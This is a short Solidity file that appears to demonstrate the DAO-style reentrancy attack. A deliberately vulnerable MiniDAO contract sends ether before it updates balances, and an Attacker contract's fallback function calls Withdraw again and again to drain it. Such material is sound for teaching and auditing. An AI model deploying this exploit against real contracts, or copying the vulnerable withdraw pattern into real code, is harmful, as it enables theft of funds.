contract MiniDAO {
    mapping (address => uint) balances;

    function Deposit() {
        balances[msg.sender] += msg.value;
    }
    
    function Withdraw(uint amount) {
        if(balances[msg.sender] < amount) throw;
        msg.sender.call.value(amount)();
        balances[msg.sender] -= amount;
    }
}

contract Attacker {
    
    // limit the recursive calls to prevent out-of-gas error
    uint stack = 0;
    uint constant stackLimit = 10;
    uint amount;
    MiniDAO dao;
    
    function Attacker(address daoAddress) {
        dao = MiniDAO(daoAddress);
        amount = msg.value;
        dao.Deposit.value(msg.value)();
    }
    
    function Attack() {
        dao.Withdraw(amount);
    }
    
    function() {
        if(stack++ < 10) {
            dao.Withdraw(amount);
        }
    }
}